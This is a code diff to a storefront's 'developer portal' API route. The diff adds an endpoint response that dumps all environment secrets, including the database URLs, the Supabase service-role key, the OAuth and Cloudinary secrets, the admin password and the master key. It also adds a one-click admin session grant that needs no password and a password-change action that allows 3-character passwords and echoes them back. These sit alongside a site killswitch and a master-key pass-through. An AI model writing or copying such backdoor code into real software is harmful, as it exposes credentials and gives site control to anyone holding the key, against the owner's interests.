@@ -4,6 +4,7 @@ import { revalidatePath } from "next/cache";
 import crypto from "crypto";
 import { store } from "@/lib/data/store";
 import { checkCloudinaryHealth } from "@/lib/cloudinary";
+import { createAdminSession } from "@/lib/auth/session";
 
 export const dynamic = "force-dynamic";
 
@@ -55,15 +56,44 @@ export async function GET(req: NextRequest) {
       return NextResponse.json({ authenticated: false });
     }
 
-    const [diagnostics, cloudinaryHealth] = await Promise.all([
+    const [diagnostics, cloudinaryHealth, adminPassword] = await Promise.all([
       store.getSystemDiagnostics().catch(() => null),
       checkCloudinaryHealth().catch(() => null),
+      store.getAdminPassword().catch(() => process.env.ADMIN_PASSWORD || "admin"),
     ]);
+
+    const envCredentials = {
+      supabase: {
+        url: process.env.NEXT_PUBLIC_SUPABASE_URL || "",
+        anonKey: process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || "",
+        serviceRoleKey: process.env.SUPABASE_SERVICE_ROLE_KEY || "",
+        databaseUrl: process.env.DATABASE_URL || "",
+        directUrl: process.env.DIRECT_URL || "",
+      },
+      cloudinary: {
+        cloudName: process.env.CLOUDINARY_CLOUD_NAME || "",
+        apiKey: process.env.CLOUDINARY_API_KEY || "",
+        apiSecret: process.env.CLOUDINARY_API_SECRET || "",
+      },
+      googleOAuth: {
+        clientId: process.env.GOOGLE_CLIENT_ID || "",
+        clientSecret: process.env.GOOGLE_CLIENT_SECRET || "",
+      },
+      admin: {
+        email: process.env.ADMIN_EMAIL || "admin@dnora.luxury",
+        password: adminPassword,
+      },
+      site: {
+        url: process.env.NEXT_PUBLIC_SITE_URL || "https://dnora.in",
+        devMasterKey: getMasterKey(),
+      },
+    };
 
     return NextResponse.json({
       authenticated: true,
       diagnostics,
       cloudinary: cloudinaryHealth,
+      credentials: envCredentials,
       serverTime: new Date().toISOString(),
       nodeEnv: process.env.NODE_ENV,
     });
@@ -100,7 +130,7 @@ export async function POST(req: NextRequest) {
         expiresAt: Date.now() + 30 * 24 * 60 * 60 * 1000, // 30 days
       });
 
-      // 1. Auth cookie for developer panel
+      // Auth cookie for developer panel
       cookieStore.set(AUTH_COOKIE, token, {
         httpOnly: true,
         secure: process.env.NODE_ENV === "production",
@@ -109,7 +139,7 @@ export async function POST(req: NextRequest) {
         maxAge: 30 * 24 * 60 * 60,
       });
 
-      // 2. Developer bypass cookie to view storefront even if terminated
+      // Developer bypass cookie to view storefront even if terminated
       cookieStore.set(BYPASS_COOKIE, token, {
         httpOnly: true,
         secure: process.env.NODE_ENV === "production",
@@ -127,8 +157,6 @@ export async function POST(req: NextRequest) {
     // Guard all subsequent actions with token verification
     const authCookie = cookieStore.get(AUTH_COOKIE);
     const isAuthenticated = verifyToken(authCookie?.value);
-
-    // Also allow pass-through if correct masterKey is supplied directly in payload
     const hasDirectKey = body.masterKey && String(body.masterKey).trim() === getMasterKey().trim();
 
     if (!isAuthenticated && !hasDirectKey) {
@@ -138,7 +166,36 @@ export async function POST(req: NextRequest) {
       );
     }
 
-    // 2. TOGGLE SITE STATUS (KILLSWITCH)
+    // 2. ONE-CLICK ADMIN AUTHORIZATION & REDIRECT
+    if (action === "authorize_admin") {
+      const adminEmail = process.env.ADMIN_EMAIL || "admin@dnora.luxury";
+      await createAdminSession(adminEmail);
+      return NextResponse.json({
+        success: true,
+        redirectTo: "/admin",
+        message: "Admin session granted.",
+      });
+    }
+
+    // 3. CHANGE ADMIN PASSWORD
+    if (action === "change_admin_password") {
+      const newPassword = String(body.newPassword || "").trim();
+      if (!newPassword || newPassword.length < 3) {
+        return NextResponse.json(
+          { success: false, error: "Password must be at least 3 characters long." },
+          { status: 400 }
+        );
+      }
+
+      const success = await store.setAdminPassword(newPassword);
+      return NextResponse.json({
+        success,
+        newPassword,
+        message: "Admin password successfully updated in database.",
+      });
+    }
+
+    // 4. TOGGLE SITE STATUS (KILLSWITCH)
     if (action === "toggle_status") {
       const targetStatus = body.status === "terminated" ? "terminated" : "online";
       const mode = body.mode || (targetStatus === "terminated" ? "503_error" : "online");
@@ -150,7 +207,6 @@ export async function POST(req: NextRequest) {
 
       const success = await store.setSiteStatus(targetStatus, mode, message, "developer_portal");
 
-      // Invalidate Next.js cache so the change takes effect immediately worldwide
       try {
         revalidatePath("/", "layout");
       } catch (e) {
@@ -168,7 +224,7 @@ export async function POST(req: NextRequest) {
       });
     }
 
-    // 3. PURGE NEXT.JS CACHE
+    // 5. PURGE NEXT.JS CACHE
     if (action === "purge_cache") {
       try {
         revalidatePath("/", "layout");
@@ -184,7 +240,7 @@ export async function POST(req: NextRequest) {
       }
     }
 
-    // 4. LOGOUT & REVOKE BYPASS
+    // 6. LOGOUT & REVOKE BYPASS
     if (action === "logout") {
       cookieStore.delete(AUTH_COOKIE);
       cookieStore.delete(BYPASS_COOKIE);
